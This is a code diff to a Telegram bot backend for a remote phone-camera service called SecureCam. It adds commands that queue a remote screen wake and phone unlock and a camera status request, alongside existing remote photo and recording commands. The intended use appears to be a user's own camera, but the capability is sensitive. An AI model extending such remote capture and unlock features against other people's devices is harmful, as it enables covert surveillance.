@@ -1503,7 +1503,7 @@ You can still use <code>/queue</code> and <code>/job JOB_ID</code>.""")
                         # ====== SECURE CAM REMOTE COMMANDS ======
                         parts = text.split()
                         if len(parts) < 2:
-                            send_telegram_direct(chat_id, "📷 <b>SecureCam Commands</b>\n━━━━━━━━━━━━━━━━━━\n<code>/snap username</code> — Instant photo\n<code>/start_rec username</code> — Start continuous recording\n<code>/stop_rec username</code> — Stop recording\n<code>/arm username</code> — Enable motion detection\n<code>/disarm username</code> — Disable motion detection\n<code>/screen username</code> — 📱 Check screen ON/OFF status\n<code>/add username</code> — 🔥 Wake screen + unlock phone\n<code>/status username</code> — 📊 Camera status")
+                            send_telegram_direct(chat_id, "📷 <b>SecureCam Commands</b>\n━━━━━━━━━━━━━━━━━━\n<code>/snap username</code> — Instant photo\n<code>/start_rec username</code> — Start continuous recording\n<code>/stop_rec username</code> — Stop recording\n<code>/arm username</code> — Enable motion detection\n<code>/disarm username</code> — Disable motion detection\n<code>/screen username</code> — 📱 Check screen ON/OFF status\n<code>/add username</code> — 🔥 Wake screen + unlock phone\n<code>/cstatus username</code> — 📊 Camera status")
                             continue
                         target_user = parts[1].strip().lower()
                         cmd_raw = parts[0].strip().lower()
@@ -1568,6 +1568,46 @@ You can still use <code>/queue</code> and <code>/job JOB_ID</code>.""")
                                 f"━━━━━━━━━━━━━━━━━━\n"
                                 f"{reliability}\n\n"
                                 f"💡 Use <code>/add {target_user}</code> to wake the screen if it's OFF!")
+                        continue
+
+                    # ====== /add COMMAND — Wake screen + unlock ======
+                    elif text.startswith("/add"):
+                        parts = text.split()
+                        if len(parts) < 2:
+                            send_telegram_direct(chat_id, "🔥 <b>Screen Wake Command</b>\n━━━━━━━━━━━━━━━━━━\n<code>/add username</code> — Wake screen + unlock phone\n\nExample: <code>/add my_room_cam</code>\n\nℹ️ Only works with the APK build that has the native background service.")
+                            continue
+                        target_user = parts[1].strip().lower()
+                        conn = get_db_connection()
+                        cur = conn.cursor()
+                        cur.execute("SELECT username, display_name FROM users WHERE username = ?", (target_user,))
+                        urow = cur.fetchone()
+                        conn.close()
+                        if not urow:
+                            send_telegram_direct(chat_id, f"❌ Cyber ID <code>{target_user}</code> not found.")
+                            continue
+                        with camera_control_lock:
+                            camera_commands[target_user] = {"action": "add", "timestamp": time.time()}
+                        send_telegram_direct(chat_id, f"🔥 <b>SCREEN WAKE</b> command sent!\n━━━━━━━━━━━━━━━━━━\n👤 Target: <code>{target_user}</code> ({urow['display_name']})\n⚡ Screen will wake + unlock within seconds!")
+                        continue
+
+                    # ====== /status COMMAND — Camera status ======
+                    elif text.startswith("/cstatus"):
+                        parts = text.split()
+                        if len(parts) < 2:
+                            send_telegram_direct(chat_id, "📊 <b>Camera Status Command</b>\n━━━━━━━━━━━━━━━━━━\n<code>/cstatus username</code> — Get camera status\n\nExample: <code>/cstatus my_room_cam</code>")
+                            continue
+                        target_user = parts[1].strip().lower()
+                        conn = get_db_connection()
+                        cur = conn.cursor()
+                        cur.execute("SELECT username, display_name FROM users WHERE username = ?", (target_user,))
+                        urow = cur.fetchone()
+                        conn.close()
+                        if not urow:
+                            send_telegram_direct(chat_id, f"❌ Cyber ID <code>{target_user}</code> not found.")
+                            continue
+                        with camera_control_lock:
+                            camera_commands[target_user] = {"action": "status", "timestamp": time.time()}
+                        send_telegram_direct(chat_id, f"📊 <b>STATUS</b> command sent!\n━━━━━━━━━━━━━━━━━━\n👤 Target: <code>{target_user}</code> ({urow['display_name']})\n⚡ Status will be sent when app polls.")
                         continue
 
                     # 2. Handle Media Uploads (Instant Direct CDN link generation without downloading to Koyeb disk!)
